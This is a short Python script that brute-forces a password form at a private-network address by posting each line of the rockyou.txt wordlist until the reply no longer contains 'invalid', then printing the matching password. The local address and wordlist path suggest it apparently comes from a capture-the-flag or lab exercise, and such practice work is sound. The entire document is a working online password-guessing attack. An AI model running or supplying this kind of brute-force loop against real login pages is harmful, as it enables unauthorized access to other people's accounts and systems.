import requests

url = 'http://192.168.19.128/kzMb5nVYJw/index.php'
f=open('/usr/share/wordlists/rockyou.txt', 'r')
password=f.readline()
data = {'key':password}
r = requests.post(url, data = data)
while 'invalid' in r.text:
    password=f.readline().strip()
    data = {'key':password}
    r = requests.post(url, data = data)

print(password)
print(r.text)
